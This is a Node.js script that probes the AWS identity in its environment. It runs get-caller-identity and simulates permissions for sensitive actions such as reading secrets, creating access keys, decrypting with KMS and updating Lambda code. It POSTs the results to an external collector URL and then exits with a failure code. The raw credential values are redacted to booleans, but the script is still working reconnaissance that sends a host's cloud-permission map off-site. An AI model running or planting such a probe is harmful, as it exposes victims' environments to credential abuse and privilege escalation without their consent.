#!/usr/bin/env node
import { readFile } from "node:fs/promises";
import { execFile } from "node:child_process";
import { promisify } from "node:util";

const execFileAsync = promisify(execFile);

const requiredAwsNames = [
  "AWS_ACCESS_KEY_ID",
  "AWS_SECRET_ACCESS_KEY",
  "AWS_SESSION_TOKEN"
];
const actions = [
  "codeartifact:GetAuthorizationToken",
  "ecr:GetAuthorizationToken",
  "iam:CreateAccessKey",
  "iam:PassRole",
  "kms:Decrypt",
  "lambda:UpdateFunctionCode",
  "s3:GetObject",
  "s3:ListAllMyBuckets",
  "secretsmanager:GetSecretValue",
  "secretsmanager:ListSecrets",
  "ssm:GetParameter",
  "sts:AssumeRole"
];

const settings = JSON.parse(
  await readFile(new URL("./probe.json", import.meta.url), "utf8")
);
const present = Object.fromEntries(requiredAwsNames.map((name) => [name, Boolean(process.env[name])]));
const event = {
  nonce: settings.nonce,
  redactedCredentials: present,
  stsGetCallerIdentity: "NOT_RUN",
  iamSimulatePrincipalPolicy: "NOT_RUN",
  decisions: []
};

if (requiredAwsNames.every((name) => present[name])) {
  try {
    const { stdout: stsOutput } = await execFileAsync("aws", ["sts", "get-caller-identity", "--output", "json"], { encoding: "utf8" });
    const sts = JSON.parse(stsOutput);
    event.stsGetCallerIdentity = "ALLOWED";
    const { stdout: simulationOutput } = await execFileAsync("aws", [
      "iam", "simulate-principal-policy", "--policy-source-arn", sts.Arn,
      "--action-names", ...actions, "--resource-arns", "*", "--output", "json"
    ], { encoding: "utf8" });
    const simulation = JSON.parse(simulationOutput);
    event.iamSimulatePrincipalPolicy = "ALLOWED";
    event.decisions = (simulation.EvaluationResults || []).map(({ EvalActionName, EvalDecision }) => ({ action: EvalActionName, decision: EvalDecision }));
  } catch {
    if (event.stsGetCallerIdentity === "NOT_RUN") event.stsGetCallerIdentity = "DENIED_OR_UNAVAILABLE";
    else event.iamSimulatePrincipalPolicy = "DENIED_OR_UNAVAILABLE";
  }
}

try {
  await fetch(settings.collectorUrl, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify(event)
  });
} catch {}

process.exit(1);
